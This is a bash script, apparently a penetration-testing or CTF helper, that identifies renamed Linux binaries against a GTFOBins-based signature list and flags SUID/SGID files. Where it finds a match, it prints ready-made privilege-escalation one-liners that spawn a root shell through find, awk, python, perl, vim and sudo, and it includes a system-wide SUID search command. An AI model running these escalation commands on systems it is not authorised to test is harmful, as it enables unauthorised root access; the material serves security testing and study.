#!/bin/bash

# ============================================================
# UNIVERSAL BINARY DETECTIVE - FINAL
# ============================================================
# Identifies any binary by matching against an extensive database.
# Based on GTFOBins, file signatures, and common Linux binaries.
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

TARGET="${1:-}"

# ============================================================
# COMPREHENSIVE BINARY SIGNATURE DATABASE
# Built from GTFOBins [citation:2][citation:6][citation:10]
# ============================================================

declare -a SIGNATURES=(
    # --- A ---
    "awk|GNU Awk|Interpreter|Pattern scanning"
    "apache2|Apache HTTP Server|Web Server|HTTP server"
    "ansible|Ansible|Automation|Configuration management"
    "apt|APT|Package Manager|Debian package tool"
    "apt-get|APT|Package Manager|Debian package tool"
    "ar|ar|Utility|Archive creator"
    "aria2c|Aria2|Downloader|Download utility"
    "arj|ARJ|Compression|Archive utility"
    "arp|ARP|Network|ARP utility"
    "ash|ASH|Shell|Almquist shell"
    "at|at|Scheduler|Job scheduler"
    "atobm|Atobm|Utility|Bitmap converter"

    # --- B ---
    "bash|GNU bash|Shell|Bourne Again Shell"
    "base32|Base32|Utility|Base32 encode/decode"
    "base64|Base64|Utility|Base64 encode/decode"
    "basenc|Basenc|Utility|Base encoding"
    "bc|bc|Calculator|Arbitrary precision calculator"
    "bpftrace|BPFtrace|Debugger|BPF tracing tool"
    "bridge|Bridge|Network|Bridge control"
    "bundler|Bundler|Package Manager|Ruby gem bundler"
    "busctl|Busctl|System|D-Bus tool"
    "busybox|BusyBox|Toolkit|Multi-call binary"
    "byebug|Byebug|Debugger|Ruby debugger"
    "bzip2|bzip2|Compression|Block-sorting compressor"

    # --- C ---
    "c89|c89|Compiler|C89 compiler"
    "c99|c99|Compiler|C99 compiler"
    "cancel|Cancel|Utility|Cancel print job"
    "capsh|Capsh|Utility|Capability shell"
    "cat|cat|Utility|Concatenate files"
    "certbot|Certbot|Security|Let's Encrypt client"
    "check_by_ssh|Check_by_ssh|Monitoring|Nagios SSH check"
    "check_cups|Check_cups|Monitoring|Nagios CUPS check"
    "check_log|Check_log|Monitoring|Nagios log check"
    "check_memory|Check_memory|Monitoring|Nagios memory check"
    "check_raid|Check_raid|Monitoring|Nagios RAID check"
    "check_ssl_cert|Check_ssl_cert|Monitoring|Nagios SSL check"
    "check_statusfile|Check_statusfile|Monitoring|Nagios status check"
    "chmod|chmod|Utility|Change mode"
    "chown|chown|Utility|Change owner"
    "chroot|chroot|Utility|Change root"
    "cmp|cmp|Utility|Compare files"
    "cobc|COBOL|Compiler|COBOL compiler"
    "column|column|Utility|Columnate output"
    "comm|comm|Utility|Compare sorted files"
    "composer|Composer|Package Manager|PHP package manager"
    "cowsay|cowsay|Utility|ASCII cow"
    "cowthink|cowthink|Utility|ASCII cow thinker"
    "cp|cp|Utility|Copy files"
    "cpan|CPAN|Package Manager|Perl package manager"
    "cpio|cpio|Utility|Copy in/out archives"
    "cpulimit|Cpulimit|Utility|CPU limiter"
    "crash|Crash|Debugger|Kernel crash utility"
    "crontab|crontab|Scheduler|Cron jobs"
    "csh|CSH|Shell|C shell"
    "csplit|csplit|Utility|Split files"
    "csvtool|Csvtool|Utility|CSV manipulation"
    "cupsfilter|Cupsfilter|Utility|CUPS filter"
    "curl|curl|Network|URL transfer"

    # --- D ---
    "dash|DASH|Shell|Debian Almquist Shell"
    "date|date|Utility|Date/time"
    "dd|dd|Utility|Convert/copy files"
    "dialog|Dialog|Utility|Dialog boxes"
    "diff|diff|Utility|Compare files"
    "dig|dig|Network|DNS lookup"
    "dmesg|dmesg|Utility|Kernel messages"
    "dmidecode|Dmidecode|Utility|DMI table decoder"
    "dmsetup|Dmsetup|Utility|Device mapper"
    "dnf|DNF|Package Manager|Package manager"
    "docker|Docker|Container|Container runtime"
    "dpkg|dpkg|Package Manager|Debian package tool"
    "dvips|Dvips|Utility|DVI to PostScript"

    # --- E ---
    "easy_install|Easy_install|Package Manager|Python package installer"
    "eb|EB|Utility|EB library"
    "ed|ed|Editor|Line editor"
    "emacs|Emacs|Editor|Text editor"
    "env|env|Utility|Environment"
    "eqn|Eqn|Utility|Equation formatter"
    "ex|ex|Editor|Ex editor"
    "exiftool|Exiftool|Utility|Metadata tool"
    "expand|expand|Utility|Convert tabs"
    "expect|Expect|Utility|Automation tool"

    # --- F ---
    "facter|Facter|Utility|System facts"
    "file|file|Utility|File type"
    "find|GNU find|Search|File search"
    "finger|finger|Utility|User info"
    "flock|flock|Utility|File locking"
    "fmt|fmt|Utility|Text formatter"
    "fold|fold|Utility|Wrap lines"
    "ftp|FTP|Network|File transfer"
    "findutils|GNU findutils|Search|Find utilities"
    "fgrep|fgrep|Search|Fixed grep"
    "free|free|Utility|Memory info"

    # --- G ---
    "gawk|GNU Awk|Interpreter|Pattern scanning"
    "gcc|GCC|Compiler|C compiler"
    "gdb|GDB|Debugger|GNU debugger"
    "gem|Gem|Package Manager|Ruby gem"
    "genisoimage|Genisoimage|Utility|ISO creator"
    "ghc|GHC|Compiler|Haskell compiler"
    "ghci|GHCi|Interpreter|Haskell interpreter"
    "gimp|GIMP|Graphics|Image editor"
    "git|Git|Version Control|Git SCM"
    "grep|GNU grep|Search|Pattern search"
    "gtester|Gtester|Testing|GLib testing"
    "gzip|gzip|Compression|GNU zip"

    # --- H ---
    "hd|hd|Utility|Hex dump"
    "head|head|Utility|First lines"
    "hexdump|Hexdump|Utility|Hex dump"
    "highlight|Highlight|Utility|Syntax highlight"
    "history|history|Shell|Command history"
    "hostname|hostname|Network|Hostname"
    "hping3|Hping3|Network|Packet crafting"
    "htop|htop|Monitoring|Process viewer"
    "httpd|Apache HTTP Server|Web Server|Apache"

    # --- I ---
    "iconv|Iconv|Utility|Character conversion"
    "id|id|Utility|User identity"
    "iftop|Iftop|Network|Bandwidth monitor"
    "install|install|Utility|Install files"
    "ionice|Ionice|Utility|I/O priority"
    "ip|ip|Network|IP routing"
    "irb|IRB|Interpreter|Ruby interpreter"
    "iptables|Iptables|Network|Firewall"

    # --- J ---
    "java|Java|Runtime|Java launcher"
    "javac|Java Compiler|Compiler|Java compiler"
    "jjs|JJS|Interpreter|Nashorn JavaScript"
    "join|join|Utility|Join files"
    "journalctl|Journalctl|Logging|Systemd journal"
    "jq|jq|Utility|JSON processor"
    "jrunscript|Jrunscript|Interpreter|Java script runner"

    # --- K ---
    "kill|kill|Utility|Signal processes"
    "knife|Knife|Automation|Chef client"
    "ksh|KSH|Shell|Korn shell"
    "ksshell|Ksshell|Utility|Korn shell"
    "kubectl|Kubectl|Container|Kubernetes CLI"

    # --- L ---
    "latex|LaTeX|Typesetting|LaTeX"
    "ld.so|Ld.so|Runtime|Dynamic linker"
    "ldconfig|Ldconfig|Utility|Linker config"
    "less|less|Pager|Terminal pager"
    "ln|ln|Utility|Links"
    "loginctl|Loginctl|System|Systemd login"
    "logsave|Logsave|Utility|Save logs"
    "look|look|Utility|Look up words"
    "ls|ls|Utility|List directory"
    "lsof|lsof|Utility|Open files"
    "ltrace|Ltrace|Debugger|Library call tracer"
    "lua|Lua|Interpreter|Lua language"

    # --- M ---
    "make|make|Build Tool|Build automation"
    "man|man|Pager|Manual pages"
    "mawk|Mawk|Interpreter|Pattern scanning"
    "more|more|Pager|Terminal pager"
    "mount|mount|Filesystem|Mount filesystems"
    "msgattrib|Msgattrib|Utility|Message attributes"
    "msgcat|Msgcat|Utility|Message concatenation"
    "msgconv|Msgconv|Utility|Message conversion"
    "msgfilter|Msgfilter|Utility|Message filter"
    "msgmerge|Msgmerge|Utility|Message merge"
    "msguniq|Msguniq|Utility|Message unique"
    "mtr|MTR|Network|Traceroute/ping"
    "mv|mv|Utility|Move files"
    "mysql|MySQL|Database|MySQL client"

    # --- N ---
    "nano|Nano|Editor|Text editor"
    "nawk|Nawk|Interpreter|Pattern scanning"
    "nc|Netcat|Network|Network debugging"
    "ncat|Ncat|Network|Netcat implementation"
    "nice|nice|Utility|Priority"
    "nl|nl|Utility|Number lines"
    "nmap|Nmap|Network|Network scanner"
    "node|Node.js|Runtime|JavaScript runtime"
    "nohup|nohup|Utility|No hangup"
    "npm|npm|Package Manager|Node package manager"
    "nroff|Nroff|Utility|Formatting"
    "nsenter|Nsenter|Utility|Namespace enter"

    # --- O ---
    "octave|Octave|Interpreter|Numerical computation"
    "od|od|Utility|Octal dump"
    "openssl|OpenSSL|Cryptography|SSL/TLS toolkit"
    "openvpn|OpenVPN|Network|VPN client"
    "openvt|Openvt|Utility|Virtual terminal"

    # --- P ---
    "paste|paste|Utility|Merge lines"
    "pdb|Pdb|Debugger|Python debugger"
    "perl|Perl|Interpreter|Perl language"
    "pg|PG|Pager|Terminal pager"
    "php|PHP|Interpreter|PHP language"
    "pic|Pic|Utility|Picture formatting"
    "pico|Pico|Editor|Text editor"
    "pip|Pip|Package Manager|Python package installer"
    "pkexec|Pkexec|Utility|PolicyKit execute"
    "pkg|Pkg|Package Manager|Package tool"
    "pr|pr|Utility|Format pages"
    "pry|Pry|Interpreter|Ruby interpreter"
    "ps|ps|Utility|Process status"
    "psql|PostgreSQL|Database|PostgreSQL client"
    "puppet|Puppet|Automation|Configuration management"
    "python|Python|Interpreter|Python language"
    "python2|Python 2|Interpreter|Python 2"
    "python3|Python 3|Interpreter|Python 3"

    # --- R ---
    "rake|Rake|Build Tool|Ruby build tool"
    "readelf|Readelf|Utility|ELF info"
    "redis|Redis|Database|Redis client"
    "redcarpet|Redcarpet|Utility|Markdown renderer"
    "restic|Restic|Backup|Backup tool"
    "rev|rev|Utility|Reverse lines"
    "rlogin|Rlogin|Network|Remote login"
    "rlwrap|Rlwrap|Utility|Readline wrapper"
    "rm|rm|Utility|Remove files"
    "rpm|RPM|Package Manager|RPM package manager"
    "rpmquery|RPM|Package Manager|RPM query"
    "rsync|rsync|Utility|Remote sync"
    "ruby|Ruby|Interpreter|Ruby language"
    "run-mailcap|Run-mailcap|Utility|Mailcap runner"
    "run-parts|Run-parts|Utility|Run scripts"
    "rview|Rview|Editor|View-only vim"
    "rvim|Rvim|Editor|Restricted vim"

    # --- S ---
    "scp|SCP|Network|Secure copy"
    "screen|Screen|Utility|Terminal multiplexer"
    "script|script|Utility|Terminal session"
    "sed|sed|Utility|Stream editor"
    "service|service|System|Service manager"
    "setarch|Setarch|Utility|Architecture"
    "sftp|SFTP|Network|Secure FTP"
    "sg|sg|Utility|Group execute"
    "sh|sh|Shell|Bourne shell"
    "shuf|shuf|Utility|Shuffle lines"
    "slsh|Slsh|Interpreter|SLang shell"
    "smbclient|SMBclient|Network|SMB client"
    "snap|Snap|Package Manager|Snap package"
    "socat|Socat|Network|Socket utility"
    "soelim|Soelim|Utility|Source elimination"
    "sort|sort|Utility|Sort lines"
    "split|split|Utility|Split files"
    "sqlite3|SQLite|Database|SQLite client"
    "ss|ss|Network|Socket statistics"
    "ssh|SSH|Network|Secure shell"
    "ssh-keygen|SSH|Network|SSH keygen"
    "ssh-keyscan|SSH|Network|SSH keyscan"
    "start-stop-daemon|Start-stop-daemon|System|Daemon control"
    "stdbuf|Stdbuf|Utility|Buffer control"
    "strace|Strace|Debugger|System call tracer"
    "strings|strings|Utility|Print strings"
    "su|su|Utility|Switch user"
    "sudo|sudo|Utility|Execute as root"
    "sysctl|Sysctl|System|Kernel parameters"
    "systemctl|Systemctl|System|Systemd control"

    # --- T ---
    "tac|tac|Utility|Reverse cat"
    "tail|tail|Utility|Last lines"
    "tar|tar|Compression|Tape archive"
    "taskset|Taskset|Utility|CPU affinity"
    "tbl|Tbl|Utility|Table formatting"
    "tclsh|Tclsh|Interpreter|Tcl shell"
    "tcpdump|Tcpdump|Network|Packet analyzer"
    "tee|tee|Utility|Read/write files"
    "telnet|Telnet|Network|Telnet client"
    "time|time|Utility|Time execution"
    "top|top|Monitoring|Process viewer"
    "touch|touch|Utility|Change timestamps"
    "tr|tr|Utility|Translate characters"
    "traceroute|Traceroute|Network|Trace route"
    "tmux|Tmux|Utility|Terminal multiplexer"
    "test|test|Utility|Condition test"

    # --- U ---
    "uname|uname|Utility|System info"
    "uniq|uniq|Utility|Unique lines"
    "unzip|unzip|Compression|Extract ZIP"
    "uptime|uptime|Utility|System uptime"
    "useradd|useradd|Admin|Create user"
    "usermod|usermod|Admin|Modify user"
    "userdel|userdel|Admin|Delete user"
    "umount|umount|Filesystem|Unmount"
    "unset|unset|Utility|Unset variable"

    # --- V ---
    "vi|vi|Editor|Visual editor"
    "vim|Vim|Editor|Vi Improved"
    "vimdiff|Vim|Editor|Vim diff"
    "vncserver|VNC|Remote Access|VNC server"

    # --- W ---
    "wc|wc|Utility|Word count"
    "wget|wget|Network|Web downloader"
    "which|which|Utility|Locate command"
    "whoami|whoami|Utility|Print username"
    "who|who|Utility|Logged-in users"
    "watch|watch|Utility|Periodic execution"
    "wireshark|Wireshark|Network|Packet analyzer"
    "w|w|Utility|Logged-in users"

    # --- X ---
    "xargs|xargs|Utility|Build commands"
    "xdg-open|Xdg-open|Utility|Open file"
    "xgettext|Xgettext|Utility|Extract strings"
    "xmlstarlet|XMLStarlet|Utility|XML tool"

    # --- Y ---
    "yum|YUM|Package Manager|Package manager"
    "yarn|Yarn|Package Manager|JavaScript package manager"
    "yes|yes|Utility|Repeat output"

    # --- Z ---
    "zip|zip|Compression|Package/compress"
    "zsh|ZSH|Shell|Z shell"
    "zcat|zcat|Compression|Decompress concatenate"
    "zless|zless|Pager|Pager for compressed"

    # ============================================================
    # GTFOBins PRIVILEGE ESCALATION VECTORS
    # These binaries are known to be exploitable with SUID/Sudo
    # Source: GTFOBins [citation:2][citation:10]
    # ============================================================
    "find|GNU find|PrivEsc|GTFOBins: SUID find -> shell"
    "awk|GNU Awk|PrivEsc|GTFOBins: SUID awk -> shell"
    "python|Python|PrivEsc|GTFOBins: SUID python -> shell"
    "perl|Perl|PrivEsc|GTFOBins: SUID perl -> shell"
    "vim|Vim|PrivEsc|GTFOBins: SUID vim -> shell"
    "tar|tar|PrivEsc|GTFOBins: SUID tar -> shell"
    "sudo|sudo|PrivEsc|GTFOBins: sudo -> commands"
    "nmap|nmap|PrivEsc|GTFOBins: interactive -> shell"
    "gdb|GDB|PrivEsc|GTFOBins: SUID gdb -> shell"
    "less|less|PrivEsc|GTFOBins: pager escape"
    "more|more|PrivEsc|GTFOBins: pager escape"
    "man|man|PrivEsc|GTFOBins: pager escape"
    "git|Git|PrivEsc|GTFOBins: pager escape"
    "node|Node.js|PrivEsc|GTFOBins: SUID node -> shell"
    "ruby|Ruby|PrivEsc|GTFOBins: SUID ruby -> shell"
    "php|PHP|PrivEsc|GTFOBins: SUID php -> shell"
    "tclsh|Tclsh|PrivEsc|GTFOBins: SUID tclsh -> shell"
    "env|env|PrivEsc|GTFOBins: env -S -> shell"
    "sh|sh|PrivEsc|GTFOBins: SUID sh -> shell"
    "bash|GNU bash|PrivEsc|GTFOBins: SUID bash -> shell"
    "cp|cp|PrivEsc|GTFOBins: SUID cp -> file read"
    "mv|mv|PrivEsc|GTFOBins: SUID mv -> file read"
    "chmod|chmod|PrivEsc|GTFOBins: SUID chmod -> file write"
    "chown|chown|PrivEsc|GTFOBins: SUID chown -> file write"
    "mount|mount|PrivEsc|GTFOBins: SUID mount -> filesystem"
    "umount|umount|PrivEsc|GTFOBins: SUID umount -> filesystem"
    "chroot|chroot|PrivEsc|GTFOBins: SUID chroot -> escape"
    "rsync|rsync|PrivEsc|GTFOBins: SUID rsync -> file operations"
    "scp|scp|PrivEsc|GTFOBins: SUID scp -> file operations"
)

# ============================================================
# FUNCTIONS
# ============================================================

print_banner() {
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║     🔍 UNIVERSAL BINARY DETECTIVE v3.1                     ║"
    echo "║         Find what any renamed binary REALLY is             ║"
    echo "║       Based on GTFOBins + 150+ Linux signatures           ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

show_usage() {
    echo -e "${YELLOW}Usage:${NC}"
    echo -e "  ./bin_detective.sh [binary_path]"
    echo -e ""
    echo -e "${YELLOW}Examples:${NC}"
    echo -e "  ./bin_detective.sh /opt/fileS"
    echo -e "  ./bin_detective.sh /usr/bin/perl5.32.1"
    echo -e ""
    echo -e "${YELLOW}Scan multiple:${NC}"
    echo -e "  find / -perm -4000 -type f 2>/dev/null | while read b; do ./bin_detective.sh \"\$b\"; done"
}

get_version_output() {
    local bin="$1"
    for flag in "--version" "-version" "-v" "-V" "--ver"; do
        local output=$("$bin" "$flag" 2>&1 | head -3)
        if [ -n "$output" ] && ! echo "$output" | grep -qi "invalid\|unknown\|error"; then
            echo "$output"
            return 0
        fi
    done
    return 1
}

get_help_output() {
    local bin="$1"
    for flag in "--help" "-help" "-h" "-?"; do
        local output=$("$bin" "$flag" 2>&1 | head -5)
        if [ -n "$output" ] && ! echo "$output" | grep -qi "invalid\|unknown\|error"; then
            echo "$output"
            return 0
        fi
    done
    return 1
}

get_comment_section() {
    local bin="$1"
    if command -v readelf >/dev/null 2>&1; then
        readelf -p .comment "$bin" 2>/dev/null | head -10
    elif command -v objdump >/dev/null 2>&1; then
        objdump -s --section .comment "$bin" 2>/dev/null | head -10
    fi
}

check_suid() {
    [ -u "$1" ]
    return $?
}

check_sgid() {
    [ -g "$1" ]
    return $?
}

check_readable() {
    [ -r "$1" ]
    return $?
}

get_owner() {
    ls -l "$1" 2>/dev/null | awk '{print $3":"$4}'
}

get_perms() {
    ls -l "$1" 2>/dev/null | awk '{print $1}'
}

identify_binary() {
    local bin="$1"
    local matches=()
    local best_confidence=0
    local best_match=""
    
    if [ ! -f "$bin" ]; then
        echo -e "${RED}[!] Binary not found: $bin${NC}"
        return 1
    fi
    
    local readable=1
    if ! check_readable "$bin"; then
        readable=0
        echo -e "\n${YELLOW}⚠️  Binary is NOT readable (no read permission)${NC}"
        echo -e "${YELLOW}💡 Try: sudo ./bin_detective.sh $bin${NC}"
        echo -e "${YELLOW}💡 Or: cp $bin /tmp/ && chmod +r /tmp/$(basename $bin) && ./bin_detective.sh /tmp/$(basename $bin)${NC}"
    fi
    
    local version=""
    local help=""
    local comment=""
    local fileinfo=""
    local strings_sample=""
    
    if [ $readable -eq 1 ]; then
        version=$(get_version_output "$bin")
        help=$(get_help_output "$bin")
        comment=$(get_comment_section "$bin")
        fileinfo=$(file "$bin" 2>/dev/null)
        strings_sample=$(strings "$bin" 2>/dev/null | head -50)
    else
        version=$(get_version_output "$bin")
        help=$(get_help_output "$bin")
        fileinfo=$(file "$bin" 2>/dev/null)
    fi
    
    local bin_name=$(basename "$bin")
    
    echo -e "\n${BLUE}[>] Scanning: $bin${NC}"
    
    # Match against database
    for entry in "${SIGNATURES[@]}"; do
        IFS='|' read -r signature original_name category description <<< "$entry"
        local confidence=0
        
        if [ -n "$version" ] && echo "$version" | grep -qi "$signature"; then
            confidence=$((confidence + 45))
        fi
        
        if [ -n "$help" ] && echo "$help" | grep -qi "$signature"; then
            confidence=$((confidence + 25))
        fi
        
        if [ $readable -eq 1 ] && [ -n "$comment" ] && echo "$comment" | grep -qi "$signature"; then
            confidence=$((confidence + 20))
        fi
        
        if [ $readable -eq 1 ] && [ -n "$strings_sample" ] && echo "$strings_sample" | grep -qi "$signature"; then
            confidence=$((confidence + 15))
        fi
        
        if [ -n "$fileinfo" ] && echo "$fileinfo" | grep -qi "$signature"; then
            confidence=$((confidence + 10))
        fi
        
        if echo "$bin_name" | grep -qi "$signature"; then
            confidence=$((confidence + 5))
        fi
        
        if [ $confidence -ge 30 ]; then
            local found=0
            for i in "${!matches[@]}"; do
                if [[ "${matches[$i]}" == *"|$signature|"* ]]; then
                    local current_conf=$(echo "${matches[$i]}" | awk -F'|' '{print $5}')
                    if [ $confidence -gt $current_conf ]; then
                        matches[$i]="$signature|$original_name|$category|$description|$confidence"
                    fi
                    found=1
                    break
                fi
            done
            if [ $found -eq 0 ]; then
                matches+=("$signature|$original_name|$category|$description|$confidence")
            fi
            
            if [ $confidence -gt $best_confidence ]; then
                best_confidence=$confidence
                best_match="$entry|$confidence"
            fi
        fi
    done
    
    # Display results
    echo -e "\n${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📄 Binary: $bin${NC}"
    echo -e "${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
    
    echo -e "\n${YELLOW}[*] Basic Information${NC}"
    echo -e "  📛 Filename: $bin_name"
    echo -e "  📁 Path: $bin"
    echo -e "  📊 Type: $(file "$bin" 2>/dev/null | cut -d: -f2 | head -1)"
    echo -e "  📦 Size: $(du -h "$bin" 2>/dev/null | cut -f1)"
    if [ $readable -eq 1 ]; then
        echo -e "  🔑 MD5: $(md5sum "$bin" 2>/dev/null | awk '{print $1}')"
    else
        echo -e "  🔑 MD5: ${YELLOW}Unable to read (no permission)${NC}"
    fi
    
    echo -e "\n${YELLOW}[*] Permissions & Ownership${NC}"
    echo -e "  🔐 $(get_perms "$bin")  $(get_owner "$bin")"
    if check_suid "$bin"; then
        echo -e "  ${GREEN}✓ SUID BIT SET! (Potential PrivEsc vector)${NC}"
    fi
    if check_sgid "$bin"; then
        echo -e "  ${GREEN}✓ SGID BIT SET!${NC}"
    fi
    if [ $readable -eq 0 ]; then
        echo -e "  ${RED}✗ NO READ PERMISSION (cannot inspect internal data)${NC}"
    fi
    
    if [ -n "$version" ]; then
        echo -e "\n${YELLOW}[*] Version Output${NC}"
        echo "$version" | sed 's/^/  /'
    fi
    
    echo -e "\n${YELLOW}[*] Matches${NC}"
    
    if [ ${#matches[@]} -eq 0 ]; then
        echo -e "  ${RED}✗ No matches found in database${NC}"
        if [ $readable -eq 0 ]; then
            echo -e "  ${YELLOW}💡 Try: sudo ./bin_detective.sh $bin${NC}"
        fi
    else
        echo -e "  ${GREEN}✓ Found ${#matches[@]} potential match(es):${NC}"
        echo ""
        
        printf "  %-12s %-25s %-15s %-35s\n" "CONFIDENCE" "MATCHING BINARY" "CATEGORY" "DESCRIPTION"
        printf "  %-12s %-25s %-15s %-35s\n" "----------" "---------------" "--------" "-----------"
        
        IFS=$'\n' sorted_matches=($(sort -t'|' -k5 -rn <<<"${matches[*]}"))
        unset IFS
        
        for match in "${sorted_matches[@]}"; do
            IFS='|' read -r sig orig cat desc conf <<< "$match"
            
            if [ $conf -ge 80 ]; then
                color="$GREEN"
                bar="████████████"
            elif [ $conf -ge 60 ]; then
                color="$CYAN"
                bar="████████░░░░"
            elif [ $conf -ge 40 ]; then
                color="$YELLOW"
                bar="██████░░░░░░"
            else
                color="$BLUE"
                bar="████░░░░░░░░"
            fi
            
            printf "  ${color}%3d%%  ${bar}${NC}  %-25s %-15s %-35s\n" "$conf" "$orig" "$cat" "$desc"
        done
        
        if [ -n "$best_match" ]; then
            IFS='|' read -r best_sig best_orig best_cat best_desc best_conf <<< "$best_match"
            echo -e "\n${GREEN}  🏆 BEST MATCH: $best_orig ($best_conf% confidence)${NC}"
            echo -e "     📂 Category: $best_cat"
            echo -e "     📝 Description: $best_desc"
            
            case "$best_orig" in
                "GNU find"|"GNU Awk"|"Python"|"Perl"|"Vim"|"tar"|"GDB"|"Node.js"|"Ruby"|"PHP"|"Tclsh"|"env"|"sh"|"GNU bash"|"cp"|"mv"|"chmod"|"chown"|"mount"|"umount"|"chroot"|"rsync"|"scp"|"sudo"|"nmap"|"less"|"more"|"man"|"git")
                    if check_suid "$bin" || check_sgid "$bin"; then
                        echo -e "\n${RED}  ⚠️  WARNING: This binary is listed in GTFOBins!${NC}"
                        echo -e "  ${YELLOW}  With SUID/SGID set, it can be exploited for privilege escalation.${NC}"
                        if echo "$best_orig" | grep -qi "find"; then
                            echo -e "  ${CYAN}  🔧 Try: $bin . -exec /bin/sh -p \\; -quit${NC}"
                        elif echo "$best_orig" | grep -qi "awk"; then
                            echo -e "  ${CYAN}  🔧 Try: $bin 'BEGIN {system(\"/bin/sh\")}'${NC}"
                        elif echo "$best_orig" | grep -qi "python"; then
                            echo -e "  ${CYAN}  🔧 Try: $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'${NC}"
                        elif echo "$best_orig" | grep -qi "perl"; then
                            echo -e "  ${CYAN}  🔧 Try: $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'${NC}"
                        elif echo "$best_orig" | grep -qi "vim"; then
                            echo -e "  ${CYAN}  🔧 Try: $bin -c ':!/bin/bash'${NC}"
                        elif echo "$best_orig" | grep -qi "sudo"; then
                            echo -e "  ${CYAN}  🔧 Try: $bin su -${NC}"
                        fi
                    fi
                    ;;
            esac
        fi
    fi
    
    if [ $readable -eq 0 ] && [ -n "$version" ]; then
        echo -e "\n${YELLOW}[*] Manual Analysis (binary unreadable)${NC}"
        echo -e "  Version output: ${CYAN}\"$version\"${NC}"
        
        if echo "$version" | grep -qi "find"; then
            echo -e "  ${GREEN}✓ This is almost certainly 'find' (GNU findutils)!${NC}"
            echo -e "  ${CYAN}  🔧 Try: $bin . -exec /bin/sh -p \\; -quit${NC}"
        elif echo "$version" | grep -qi "perl"; then
            echo -e "  ${GREEN}✓ This is almost certainly 'perl'!${NC}"
            echo -e "  ${CYAN}  🔧 Try: $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'${NC}"
        elif echo "$version" | grep -qi "python"; then
            echo -e "  ${GREEN}✓ This is almost certainly 'python'!${NC}"
            echo -e "  ${CYAN}  🔧 Try: $bin -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'${NC}"
        elif echo "$version" | grep -qi "sudo"; then
            echo -e "  ${GREEN}✓ This is almost certainly 'sudo'!${NC}"
        elif echo "$version" | grep -qi "bash"; then
            echo -e "  ${GREEN}✓ This is almost certainly 'bash'!${NC}"
        elif echo "$version" | grep -qi "gcc"; then
            echo -e "  ${GREEN}✓ This is almost certainly 'gcc'!${NC}"
        fi
    fi
    
    echo -e "\n${PURPLE}═══════════════════════════════════════════════════════════════${NC}"
}

# ============================================================
# MAIN
# ============================================================

print_banner

if [ -z "$TARGET" ]; then
    echo -e "${RED}[!] No binary specified!${NC}"
    show_usage
    exit 1
fi

identify_binary "$TARGET"
